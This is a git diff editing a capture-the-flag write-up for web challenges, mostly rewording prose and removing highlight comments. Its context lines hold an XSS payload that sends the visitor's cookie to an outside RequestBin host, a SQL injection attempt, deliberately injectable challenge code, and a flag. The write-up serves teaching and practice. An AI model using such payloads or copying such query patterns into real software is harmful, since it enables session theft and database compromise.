@@ -16,7 +16,9 @@ Ah, the classic pastebin. Can you get the admin's cookies?
 ## Solution
 For this challenge, we are given two links. One is a mock pastebin website where you can enter text, submit it, and be given a link to where it persists. The second link is a website that allows you to redirect a bot to a specific URL.
 
-Based on the nature of the websites and the description it's fairly clear that this is a classic XXS challenge. The mock pastebin website allows JavaScript that we write to be injected into the DOM of whoever visits the page. We can exploit this to steal a person's cookie. First, I created a public [RequestBin](https://requestbin.com/) as an endpoint for our exploit. Then I created a new paste with the following content:
+Based on the nature of the websites, and the description of the challenge, it's fairly clear that this is a classic XXS challenge. The mock pastebin website allows JavaScript that we write to be injected into the DOM of whoever visits the page. We can exploit this to steal a cookie of whoever visits the page with our JavaScript injection. 
+
+First, I created a public [RequestBin](https://requestbin.com/) as an endpoint for our exploit. Then I created a new paste with the following content:
 
 ```html
 <script>
@@ -27,7 +29,7 @@ document.write('<img src="https://en2enweozjgy8.x.pipedream.net?c='+document.coo
 I then took the link to the newly created paste and fed it to the admin bot. The flag then appeared as a GET parameter in the RequestBin.
 ![[../Files/inspect-me-requestbin.png]]
 
-When the admin bot visits our link the JavaScript within the `<script>` tag gets run. The script tries to create an image with the source of our RequestBin and the admin's cookie as GET parameter. The admin bot will then make a request to our endpoint which we can capture, thus exposing the cookie (flag).
+When the admin bot visits our link the JavaScript within the `<script>` tag gets run. The script tries to create an image with the source of our RequestBin and the admin's cookie as GET parameter. The admin bot will then make a request to our endpoint which we can capture, thus exposing the cookie which contains the flag.
 
 ## Flag
 `flag{d1dn7_n33d_70_b3_1n_ru57}`
@@ -46,18 +48,16 @@ For this challenge, we are given a web page with a simple login screen. Attempti
 
 ![[../Files/secure-login.png]]
 
-We are also given the application code in `index.js`. Reading through this code we can see that it is SQL injectable.
+We are also given the application code in `index.js`. Reading through this code we can see that it is SQL injectable:
 
 ```js
 app.post('/login', (req, res) => {
   if (!req.body.username || !req.body.password)
     return res.redirect('/?message=Username and password required!');
 
-  // highlight-start
   const query = `SELECT id FROM users WHERE
           username = '${req.body.username}' AND
           password = '${req.body.password}';`;
-  // highlight-end
   try {
     const id = db.prepare(query).get()?.id;
 
@@ -75,7 +75,7 @@ Attempting to SQL inject doesn't seem to work. Trying to use the username `' OR 
 
 ![[../Files/secure-login-inject.png]]
 
-The username injection here seems to be encoded in base64 which is preventing the injection from completing. The source of the login page supports this, showing that the username and password inputs are base64 encoded on the client-side before being sent to the server using the `btoa()` function.
+The username injection here seems to be encoded in base64 which is preventing the injection from completing. The source code of the login page supports this, showing that the username and password inputs are base64 encoded on the client-side before being sent to the server using the `btoa()` function.
 
 ```html
 <script>
@@ -87,7 +87,6 @@ The username injection here seems to be encoded in base64 which is preventing th
     form.setAttribute('method', 'POST');
     form.setAttribute('action', '/login');
 
-    // highlight-start
     const username = document.createElement('input');
     username.setAttribute('name', 'username');
     username.setAttribute('value',
@@ -99,7 +98,6 @@ The username injection here seems to be encoded in base64 which is preventing th
     password.setAttribute('value',
         btoa(document.querySelector('#password').value)
     );
-    // highlight-end
 
     form.appendChild(username);
     form.appendChild(password);
@@ -170,10 +168,8 @@ allowed_characters = set(
 ...
 
 def check_login(username, password):
-    # highlight-start
     if any(c not in allowed_characters for c in username):
         return False
-    # highlight-end
     correct_password = execute(
         f'SELECT password FROM users WHERE username=\'{username}\';'
     )
@@ -186,10 +182,8 @@ This same check for non-alphanumeric characters happens in the `create_user()` f
 
 ```python
 def create_user(username, password):
-    # highlight-start
     if any(c not in allowed_characters for c in username):
         return (False, 'Alphanumeric usernames only, please.')
-    # highlight-end
     if len(username) < 1:
         return (False, 'Username is too short.')
     if len(password) > 50:
@@ -199,12 +193,10 @@ def create_user(username, password):
     )
     if len(other_users) > 0:
         return (False, 'Username taken.')
-    # highlight-start
     execute(
         'INSERT INTO users (username, password)'
         f'VALUES (\'{username}\', \'{password}\');'
     )
-    # highlight-end
     return (True, '')
 ```
 
